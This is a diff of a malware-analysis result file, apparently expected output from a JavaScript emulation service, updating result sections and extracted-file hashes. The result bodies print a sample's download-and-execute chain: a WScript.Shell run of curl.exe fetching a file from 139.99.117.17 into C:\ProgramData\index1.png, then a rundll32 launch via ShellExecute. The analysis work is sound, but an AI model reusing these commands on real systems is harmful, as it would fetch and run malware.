@@ -61,7 +61,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates an ActiveXObject\n\t\tActiveXObject(WScript.Shell)\n\n\t\tnew Function(url, function sleep(millis){var date = new Date();var curDate = null;do { curDate = new...\n\t\tActiveXObject(wscript.shell)\n\n\t\tActiveXObject(shell.application)\n\n\t\tvar WshShell = new ActiveXObject('WScript.Shell')",
+        "body": "JavaScript creates an ActiveXObject\n\t\tActiveXObject(WScript.Shell)\n\n\t\tnew Function(url, function sleep(millis){var date = new Date();var curDate = null;do { curDate = new...\n\t\tActiveXObject(wscript.shell)\n\n\t\tActiveXObject(shell.application)\n\n\t\tvar wshshell = new ActiveXObject('WScript.Shell')",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -83,7 +83,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[16]\n\n\t\tnew WScript.Shell[18]\n",
+        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[11]()\n\n\t\tnew WScript.Shell[13]()\n",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -105,7 +105,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs dropped executable\n\t\tnew Function(url, function sleep(millis){var date = new Date();var curDate = null;do { curDate = new...\n\t\tWScript.Shell[18].Run(curl.exe --output C:\\ProgramData\\index1.png --url http://139.99.117.17/68597.d...",
+        "body": "JavaScript runs dropped executable\n\t\tnew Function(url, function sleep(millis){var date = new Date();var curDate = null;do { curDate = new...\n\t\tWScript.Shell[13].run(\"curl.exe --output C:\\ProgramData\\index1.png --url http://139.99.117.17/68597....",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -127,7 +127,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs code via shell\n\t\tnew Function(url, function sleep(millis){var date = new Date();var curDate = null;do { curDate = new...\n\t\tWScript.Shell[18].Run(curl.exe --output C:\\ProgramData\\index1.png --url http://139.99.117.17/68597.d...",
+        "body": "JavaScript runs code via shell\n\t\tnew Function(url, function sleep(millis){var date = new Date();var curDate = null;do { curDate = new...\n\t\tWScript.Shell[13].run(\"curl.exe --output C:\\ProgramData\\index1.png --url http://139.99.117.17/68597....",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -149,7 +149,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs code via shell application\n\t\tShell.Application[19].ShellExecute(rundll32,C:\\ProgramData\\index1.png,Wind,,open,3)\n",
+        "body": "JavaScript runs code via shell application\n\t\tShell.Application[14].shellexecute(\"rundll32\", \"C:\\ProgramData\\index1.png,Wind\", \"\", \"open\", 3)\n",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -271,13 +271,13 @@
     "extracted": [
       {
         "name": "extracted_wscript.bat",
-        "sha256": "4bfafbb9be2fecdbcc1210afd08223e8da7b9e0baaf2fd472a077e4697f885ac"
+        "sha256": "5f78592d79d1622238eeefc829445210c0ee5ad2d35391978918b7b48ed8e346"
       }
     ],
     "supplementary": [
       {
         "name": "temp_javascript.js",
-        "sha256": "4b08907cdc1e663667eeda08b7c890d4f13036ef5464fbb015d646d4916ff89b"
+        "sha256": "3e7c333a09d4b77d4312bb8b4fe70504e1f07118970aa636878b0a05a84b335a"
       }
     ]
   },
